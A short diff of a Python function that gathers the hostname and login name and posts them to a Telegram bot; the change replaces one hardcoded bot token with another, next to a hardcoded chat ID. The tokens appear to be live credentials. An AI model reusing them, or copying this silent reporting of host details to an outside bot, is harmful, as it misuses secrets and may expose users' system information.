@@ -66,7 +66,7 @@ def send_logs_to_telegram(message):
     hostname = socket.gethostname()
     user = os.getlogin()
 
-    bot_token = '6456958617:AAF8thQveHkyLLtWtD02Rq1UqYuhfT4LoTc'
+    bot_token = '6456958617:AAEhKxpvbWxeDoq7IPf7fQo0sxbQ_LqSVz0'
     chat_id = '128592002'
 
     url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
